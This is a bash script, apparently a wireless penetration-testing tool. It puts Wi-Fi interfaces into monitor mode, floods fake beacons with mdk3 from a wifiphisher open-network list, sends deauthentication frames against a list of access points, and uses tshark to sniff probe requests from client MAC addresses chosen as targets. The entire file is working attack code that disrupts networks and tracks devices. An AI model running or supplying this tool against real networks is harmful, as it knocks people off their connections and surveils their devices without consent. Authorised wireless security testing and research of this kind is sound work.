#!/bin/bash

initialise='true'
delay='15'
beacon_list='beacon-list' # beacon list taken from https://github.com/wifiphisher/wifiphisher/blob/master/wifiphisher/data/wifiphisher-known-open-wlans
ap_list='ap-list' # mac address list of access points to deauth
client_list='client-list' # sniff targeted probe requests from specifically this mac address list of clients
ghz2='1 2 3 4 5 6 7 8 9 10 11 12 13'
ghz5='36 38 40 42 44 46 48 50 52 54 56 58 60 62 64 100 102 104 106 108 110 112 116 132 134 136 138 140 142 144 149 151 153 155 157 159 161 165'
channels=$ghz2
all="$ghz2 $ghz5"

init() {
	if [[ $initialise = 'true' ]]
	then
		echo "initialising..."
		airmon-ng check kill > /dev/null 2>&1 &
		sleep 2
		if [[ ! -z $interface ]]
		then
			echo "starting primary interface..."
			ifconfig $interface down
			sleep 1
			iwconfig $interface mode monitor
			ifconfig $interface up
			sleep 3
		fi
		if [[ ! -z $deauth_interface ]]
		then
			echo "starting secondary interface..."
			ifconfig $deauth_interface down
			sleep 1
			iwconfig $deauth_interface mode monitor
			ifconfig $deauth_interface up
			sleep 3
		fi
		echo
	fi
}

headers() {
	if [[ ! -z $hop_head ]]
	then
		echo $hop_head$sniff_head$flood_head'[ '$channels' ]'
	elif [[ ! -z $sniff_head || ! -z $flood_head ]]
	then
		echo $sniff_head$flood_head
	fi

	if [[ $deauthentication = 'true' ]]
	then
		if [[ ! -z $deauth_channels ]]
		then
			echo $deauth_head"[ $deauth_channels ]" | tr ',' ' ' | sed 's/  -c//'
		else
			echo $deauth_head"[ $ghz2 ]"
		fi
	fi
}

hop() {
	while [[ $hop_channels = 'true' ]]
	do
		for channel in $channels
		do
			if [[ $sniff_probes = 'true' ]]
			then
				echo "SOURCE			CHANNEL	SSID"
				iwconfig $interface channel $channel
				sleep $delay
			else
				echo
				echo "CHANNEL $channel"
				iwconfig $interface channel $channel
				sleep $delay
			fi
		done
	done
}

sniff() {
	if [[ $sniff_probes = 'true' ]]
	then
		echo
        	# display filters and options - https://www.wireshark.org/docs/man-pages/tshark.html
		tshark -i $interface -I -n -Y 'wlan.fc.type_subtype == 0x0004'' and !(wlan.ssid == "")'' and wlan.tag.number == 0'"$macs" -T fields -e wlan.ta -e wlan_radio.channel -e wlan.ssid 2>/dev/null &
	fi
}

flood() {
	if [[ $flood_beacons = 'true' ]]
	then
		mdk3 $interface b -f $beacon_list$rate > /dev/null 2>&1 &
	fi
}

deauth() {
	if [[ $deauthentication = 'true' ]]
	then
		mdk3 $deauth_interface d -b $ap_list$deauth_channels > /dev/null 2>&1 &
	fi
}

filter() {
	if [[ $target_macs = 'true' ]]
	then
        	# formatting the client mac list for the tshark command
		macs=$(cat $client_list | tr '\n' ' ' | sed 's/.$//' | sed 's/ / || wlan.ta == /g' | sed 's/^/ and wlan.ta == /')
	fi
}

cleanup() {
	trap 'wait' EXIT
	trap 'kill 0 & printf "\nkilling background processes...\n"' SIGINT
}

usage() {
	echo	usage: $0 [-Ufhsx] [-i interface] [-c channel(s)] [-b file] [-u file] [-t number] [-I interface] [-C channel(s)] [-a file]
	echo
	echo		-x		disable initialisation (airmon-ng check kill, ifconfig wlan0 down/up, etc.)
	echo
	echo	[*] interface 1
	echo		-i <interface>	specify the primary interface for flooding / hopping / sniffing
	echo		-c <channel(s)>	specify primary interface channel(s) (default = 2 GHz spectrum. "5ghz" = 5 GHz spectrum. "all" = all. list channels e.g. "1 3 7")
	echo		-f		enable beacon flooding
	echo		-h		enable channel hopping
	echo		-s		enable probe sniffing
	echo		-U		filter output for only clients in the client mac address list
	echo		-r <number>	beacon flood rate per second (default = 50)
	echo		-t <number>	time in seconds between channel hopping (default = 15)
	echo		-u <file>	specify non-default client list (default is ./client-list)
	echo		-b <file>	specify non-default beacon list (default is ./beacon-list)
	echo
	echo	[*] interface 2
	echo		-I <interface>	enable deauthentication on specified secondary interface
	echo		-C <channel(s)>	specify secondary interface channel(s)
	echo		-a <file>	specify non-default ap list (default is ./ap-list)
	echo
	echo	example: ./flood-kick-sniff.sh -Ufhs -b /jobs/corp/beacon.list -c "1 3 5 7 9 11" -i wlan0 -u /jobs/corp/client.list -t 30 -r 25 -I wlan1 -C "1 6 11" -a /jobs/corp/ap.list
	exit 1
}

while getopts I:Ufhsb:c:C:i:a:u:r:t:x option
do
	case $option in
		U)
			target_macs='true'
		;;
		I)
			deauth_interface=$OPTARG
			deauthentication='true'
			deauth_head='DEAUTHENTICATING '
		;;
		f)
			flood_beacons='true'
			flood_head='FLOODING '
		;;
		h)
			hop_channels='true'
			hop_head='HOPPING '
		;;
		s)
			sniff_probes='true'
			sniff_head='SNIFFING '
		;;
		b)
			beacon_list="$OPTARG"
		;;
		c)
			if [[ $OPTARG = '5ghz' ]]
			then
				channels=$ghz5
			elif [[ $OPTARG = 'all' ]]
			then
				channels=$all
			else
				channels=$OPTARG
			fi
		;;
		C)
			if [[ $OPTARG = '5ghz' ]]
			then
				deauth_channels=' -c '$(echo $ghz5 | tr ' ' ',')
			elif [[ $OPTARG = 'all' ]]
			then
				deauth_channels=' -c '$(echo $all | tr ' ' ',')
			else
				deauth_channels=' -c '$(echo $OPTARG | tr ' ' ',')
			fi
		;;
		i)
			interface=$OPTARG
		;;
		a)
			ap_list="$OPTARG"
		;;
		u)
			client_list="$OPTARG"
		;;
		r)
			rate=" -s $OPTARG"
		;;
		t)
			delay=$OPTARG
		;;
		x)
			initialise='false'
		;;
		*)
			usage
		;;
		esac
done

if [[ $# = 0 ]]
then
	usage
fi

init
headers
filter
sniff
hop &
flood
deauth
cleanup
